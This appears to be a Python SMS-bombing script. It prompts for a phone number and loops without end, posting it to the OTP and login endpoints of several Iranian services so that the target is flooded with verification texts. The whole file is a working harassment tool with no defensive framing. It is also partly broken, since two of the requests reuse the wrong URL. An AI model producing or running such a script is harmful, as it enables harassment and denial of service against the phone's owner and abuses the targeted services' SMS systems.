import requests
import time

Enter = input ("phon number :"); 

while True :
    url_baslam = "https://auth.basalam.com/otp-request"
    number = {"mobile":""+Enter}
    sms = requests.post(url_baslam,data=number) 
    print(sms.status_code)
    time.sleep(1)

    url_bitpin = "https://api.bitpin.org/v2/usr/signin/"
    number2 = {"phone":""+Enter}
    sms = requests.post(url_bitpin,data=number2) 
    print(sms.status_code)
    time.sleep(1)

    url_z = "https://next.zarinpal.com/api/oauth/initialize"
    number3 = {"username":""+Enter}
    sms = requests.post(url_z,data=number3) 
    print(sms.status_code)
    time.sleep(1)

    url_b = "https://bimebazar.com/accounts/api/login_sec/"
    number4 = {"username":""+Enter}
    sms = requests.post(url_b,data=number4) 
    print(sms.status_code)
    time.sleep(1)

    url_snap = "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp"
    number5 = {"cellphone":"+98"+Enter}
    sms = requests.post(url_snap,data=number5) 
    print(sms.status_code)
    time.sleep(1)

    url_divar = "https://api.divar.ir/v5/auth/authenticate"
    number6 = {"phone":"" + Enter}
    sms = requests.post(url_snap,data=number6) 
    print(sms.status_code)
    time.sleep(1)

    url_behtarino = "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/"
    number7 = {"phone":"" + Enter}
    sms = requests.post(url_snap,data=number7) 
    print(sms.status_code)
    time.sleep(1)
